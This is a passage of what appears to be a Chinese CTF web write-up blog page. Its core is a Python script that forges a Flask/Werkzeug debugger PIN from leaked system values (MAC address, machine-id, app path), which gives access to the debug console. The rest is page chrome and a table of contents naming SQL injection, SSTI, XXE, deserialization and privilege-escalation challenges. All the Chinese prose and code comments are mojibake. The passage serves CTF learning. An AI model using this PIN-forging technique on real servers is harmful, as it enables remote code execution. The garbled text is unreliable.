<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/m1xian/p/18528813</span><br></pre></td></tr></table></figure>

<p>uuid:</p>
<p><img src="/../images/image-20251114105200234.png" alt="image-20251114105200234"></p>
<p>machine_id:</p>
<p><img src="/../images/image-20251114105310262.png" alt="image-20251114105310262"></p>
<p><img src="/../images/image-20251114105332937.png" alt="image-20251114105332937"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line"># å¯èƒ½æ˜¯å…¬å¼€çš„ä¿¡æ¯éƒ¨åˆ†</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;,  # /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,  # é»˜è®¤å€¼</span><br><span class="line">    &#x27;Flask&#x27;,  # é»˜è®¤å€¼</span><br><span class="line">    &#x27;/home/ctf/app/app.py&#x27;  # moddirï¼ŒæŠ¥é”™å¾—åˆ°</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># ç§æœ‰ä¿¡æ¯éƒ¨åˆ†</span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;42362379744178&#x27;,  # /sys/class/net/eth0/address åè¿›åˆ¶</span><br><span class="line">    &#x27;89b34b88-6f33-4c4b-8a30-69a4ba41fd0e&#x27;</span><br><span class="line">    # machine-idéƒ¨åˆ†</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># åˆ›å»ºå“ˆå¸Œå¯¹è±¡</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"></span><br><span class="line"># è¿­ä»£å¯èƒ½å…¬å¼€å’Œç§æœ‰çš„ä¿¡æ¯è¿›è¡Œå“ˆå¸Œè®¡ç®—</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line"></span><br><span class="line"># åŠ ç›å¤„ç†</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line"># ç”Ÿæˆ cookie åç§°</span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line">print(cookie_name)</span><br><span class="line"></span><br><span class="line"># ç”Ÿæˆ pin ç </span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line"># æ ¼å¼åŒ– pin ç </span><br><span class="line">rv = None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>è·å–äº†pinç ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è·å–cookieï¼Œå°±ç›´æ¥è´´å®˜päº†</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VZSk9KRRv7gZ25EXD1AlZQ">å¾®ä¿¡å…¬ä¼—å¹³å°</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://cyl-love.github.io">é™ˆç¾½ç³</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://cyl-love.github.io/posts/15956.html">https://cyl-love.github.io/posts/15956.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://cyl-love.github.io" target="_blank">å†åŠªåŠ›ä¸€ç‚¹ï¼Œå¥¹æ˜¯ä¸æ˜¯å°±ä¼šå›æ¥</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/55713.html" title="é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹jsé€†å‘åŸºç¡€"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹jsé€†å‘åŸºç¡€</div></div><div class="info-2"><div class="info-item-1">å‰è¨€12ç›®å‰å¤§é‡çš„æµ‹è¯•çš„ç«™ç‚¹å½“ä¸­å‘ç°å¾ˆå¤§éƒ¨åˆ†ä½¿ç”¨äº†åŠ å¯†ï¼Œåˆšå¥½a1ä½¬ä¹Ÿç»™è®²äº†è¿™ä¸€éƒ¨åˆ†äºæ˜¯åšä¸€åšencrypt-labsé¶åœºï¼ŒåŠ å¼ºå­¦ä¹ ä¸€ä¸‹ï¼Œä¸æ¶‰åŠæ··æ·†ä»¥åŠjsrpcéƒ¨åˆ†  é¶åœºï¼šhttps://github.com/SwagXz/encrypt-labs butt3rf1yå§å§çš„wpï¼š(ï½¡ï½¥Ï‰ï½¥ï½¡)æ³¥åš è¿˜å­¦ä¹ äº†é¶åœºå¸ˆå‚…æ¨èçš„æ–‡ç« å°±ä¸å¼•ç”¨äº†ï¼Œå¯ä»¥å»ä¸Šé¢GitHubé“¾æ¥æŸ¥çœ‹ã€‚ jsé€†å‘AES å›ºå®š key 1å®šä½å…¶aesä»£ç    1ç»™äº†keyï¼Œivæ”¾åˆ°æ’ä»¶ä¸Šè§£å¯†å°±å¥½äº†   AES æœåŠ¡ç«¯è·å– Key1ä¼šæœ‰ä¸¤ä¸ªè¯·æ±‚çš„æ•°æ®åŒ…ï¼Œç¬¬ä¸€ä¸ªæ˜¯è¿”å›aes_key,ivã€‚ç¬¬äºŒä¸ªæ˜¯è¯·æ±‚çš„åŠ å¯†çš„ç™»å½•è¯·æ±‚    1å®šä½åˆ°jsä»£ç ï¼Œå°è¯•å¤šè¯·æ±‚å‡ æ¬¡ï¼Œå‘ç°æœåŠ¡ç«¯çš„keyï¼Œivæ²¡æœ‰æ”¹å˜ï¼Œè·Ÿä¸Šé¢æ„ä¸€æ ·è§£å¯†æ„é€ å°±å¥½äº†     1å°†passwordæ”¹æˆ123456å³å¯æ˜¾ç¤ºtrue   RSA åŠ å¯†1jsä»£ç å®šä½åˆ°publickey   1234å› ä¸ºåªè·å¾—äº†å…¬é’¥ï¼Œæ‰€ä»¥åªèƒ½åŠ å¯†æ‹¿ç€å…¬é’¥å»æ„é€ &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&q...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/63963.html" title="ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹moectf2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-15</div><div class="info-item-2">ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹moectf2025</div></div><div class="info-2"><div class="info-item-1">å‰è¨€123å½“åˆå·å¸ˆèŒƒå¤§å­¦cssecä¿¡å®‰ç»„çš„CoHyuå¤§å¸ˆå‚…çš„ä¸€å¥moectfæ˜¯æ¢¦å¼€å¯çš„åœ°æ–¹ä»¥åŠSonderå¤§å¸ˆå‚…çš„moectfçš„é¢˜è´¨é‡éƒ½å¾ˆé«˜ï¼Œå¯ä»¥åŠ æ²¹å­¦å­¦.äºæ˜¯å°±æ‰“äº†moectf2025ï¼Œä½†æ—¶é—´çº¿å¤ªé•¿äº†å°±æ‰“äº†ä¸€å‘¨ï¼Œç°åœ¨å®Œèµ›äº†äºæ˜¯æ‰“ç®—å¤ç°ä¸€æ‰‹webä»¥åŠpwnéƒ¨åˆ†ï¼Œpwnéƒ¨åˆ†å°±æ”¾åˆ°ã€Šæ¯å¤©éƒ½è¦pwnä¸€ç‚¹ã€‹ç³»åˆ—äº†  moectf20251https://ctf.xidian.edu.cn/training/22  web0 Webå…¥é—¨æŒ‡åŒ—123ä½ çŸ¥é“ä»€ä¹ˆæ˜¯æ§åˆ¶å°å—ï¼Ÿå¿«å»äº†è§£ä¸€ä¸‹å§ï¼((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]).......  è€ƒç‚¹ï¼šjsfuckç¼–ç ã€‚å¯ä»¥æ§åˆ¶å°...</div></div></div></a><a class="pagination-related" href="/posts/38132.html" title="ç¬¬ä¸€å±ŠNetDreamCTFèµ›åå¤ç°"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-17</div><div class="info-item-2">ç¬¬ä¸€å±ŠNetDreamCTFèµ›åå¤ç°</div></div><div class="info-2"><div class="info-item-1">ç¬¬ä¸€å±ŠNetDreamCTFèµ›åå¤ç°ï¼ˆéƒ¨åˆ†é¢˜ç›®ï¼‰å…¨éƒ¨çš„é¢˜è§£ï¼šhttps://mp.weixin.qq.com/s/zl151-YJSiyj0TvjKmNggw å­˜æ¡£ï¼šhttps://github.com/Team-intN18-SoybeanSeclab/NetDreamCTF2025_Source çº¸è±ªå­¦é•¿çš„è®²è§£ï¼šnetdream2025é¢˜ç›®è®²è§£ ezpwn&amp;ezupload&amp;ezbypass_å“”å“©å“”å“©_bilibili  Miscç­¾åˆ°1é¢˜ç›®ï¼šä½ çŸ¥é“Baseå’ŒTXTå—?Y3RmLmN0Zi52aW4=  base64è§£ç ä¹‹å txtåŸŸåè§£æè®°å½•   I AM K!123456789101112131415161718192021222324252627282930313233343536373839é¢˜ç›®ï¼šB3F0reèµµçš„ç«‹æ–¹ä½“-1398441600import base64def encrypt(plaintext, key):    key_sum = sum(ord(char) for char in key)    if not plaintext.sta...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">é™ˆç¾½ç³</div><div class="author-info-description">æ¯å¤©èƒ½ä¸èƒ½pwnä¸€ç‚¹</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cyl-love"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cyl-love" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">Love life, alwaysâ€”loveforver in the small.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf%E2%80%93web"><span class="toc-number">1.</span> <span class="toc-text">?ctfâ€“web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">å‰è¨€</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week1"><span class="toc-number">2.1.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#from-http"><span class="toc-number">2.1.1.</span> <span class="toc-text">from_http</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Ahttp%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šhttpåè®®</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ping"><span class="toc-number">2.1.2.</span> <span class="toc-text">Ping??</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Alinux%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šlinuxå‘½ä»¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gitttttttt"><span class="toc-number">2.1.3.</span> <span class="toc-text">Gitttttttt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-git%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">è€ƒç‚¹ï¼š.gitä¿¡æ¯æ³„éœ²</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%8D%E6%98%8E%E4%B8%9C%E8%A5%BF%E7%9A%84%E9%A3%9F%E7%89%A9%EF%BC%9F%EF%BC%81"><span class="toc-number">2.1.4.</span> <span class="toc-text">åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Aphp%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BB%A5%E5%8F%8A%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secret-of-php"><span class="toc-number">2.1.5.</span> <span class="toc-text">secret of php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Aphp%E7%9A%84%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E5%B0%8F%E6%B8%B8%E6%88%8F"><span class="toc-number">2.1.6.</span> <span class="toc-text">å‰ç«¯å°æ¸¸æˆ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Ajs%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2"><span class="toc-number">2.2.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%92%8C%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.2.1.</span> <span class="toc-text">ç™»å½•å’ŒæŸ¥è¯¢</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´+sqlæ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Only-Picture-Up"><span class="toc-number">2.2.2.</span> <span class="toc-text">Only Picture Up</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Regular-Expression"><span class="toc-number">2.2.3.</span> <span class="toc-text">Regular Expression</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-number">2.2.4.</span> <span class="toc-text">ç•™è¨€æ¿</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9ASSTI%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šSSTIæ¼æ´</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.5.</span> <span class="toc-text">è¿™æ˜¯ä»€ä¹ˆå‡½æ•°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Apython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Look-at-the-picture"><span class="toc-number">2.2.6.</span> <span class="toc-text">Look at the picture</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Aphp%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.6.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šphpä¼ªåè®®</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-number">2.3.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%9F%A5%E5%BF%86"><span class="toc-number">2.3.1.</span> <span class="toc-text">æŸ¥æŸ¥å¿†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E6%97%A0%E5%9B%9E%E6%98%BExxe"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šæ— å›æ˜¾xxe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E5%A4%A7%E6%9D%82%E7%83%A9"><span class="toc-number">2.3.2.</span> <span class="toc-text">é­”æœ¯å¤§æ‚çƒ©</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9APHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84POP%E9%93%BE"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezphp"><span class="toc-number">2.3.3.</span> <span class="toc-text">Ezphp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9-php%E9%9D%9E%E6%B3%95%E5%8F%82%E6%95%B0%E5%90%8D%E4%BC%A0%E5%8F%82-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">è€ƒç‚¹:phpéæ³•å‚æ•°åä¼ å‚,æ— å­—æ¯æ•°å­—rce,å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">é¢„æœŸè§£</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">éé¢„æœŸè§£</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">2.3.4.</span> <span class="toc-text">MySQLç®¡ç†å·¥å…·</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9AJWT%E4%BC%AA%E9%80%A0%EF%BC%8CMySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-py-yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.3.4.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´,py-yamlååºåˆ—åŒ–</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VIP"><span class="toc-number">2.3.5.</span> <span class="toc-text">VIP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Ago-ssti-%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.5.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šgo ssti+åŠ«æŒç¯å¢ƒå˜é‡ææƒ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E5%8F%88%E6%98%AF%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.6.</span> <span class="toc-text">è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9APython-Flask%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.6.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šPython Flaskå†…å­˜é©¬</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4"><span class="toc-number">2.4.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%91Road-to-Hero"><span class="toc-number">2.4.1.</span> <span class="toc-text">ã€æœªå®Œæˆã€‘Road to Hero</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Aphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%9E%84%E9%80%A0%E5%92%8Cphp%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7%E8%BF%98%E6%9C%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%91ez-Ref"><span class="toc-number">2.4.2.</span> <span class="toc-text">ã€æœªå®Œæˆã€‘ez_Ref</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E7%AE%80%E5%8D%95%E7%9A%84java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šç®€å•çš„javaååºåˆ—åŒ–é¢˜</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A5getshell%E9%80%9F%E5%BA%A6"><span class="toc-number">2.4.3.</span> <span class="toc-text">æ¥getshellé€Ÿåº¦!</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Aphp%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84trick%E4%BB%A5%E5%8F%8ACVE-2025-32462%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apple-or-android"><span class="toc-number">2.4.4.</span> <span class="toc-text">Apple or android</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1ssrf%EF%BC%8Cssrf%E6%89%93mysql%EF%BC%8CGopherus%E4%BD%BF%E7%94%A8%E8%81%94%E5%8A%A8"><span class="toc-number">2.4.4.1.</span> <span class="toc-text">è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waf-waf"><span class="toc-number">2.4.5.</span> <span 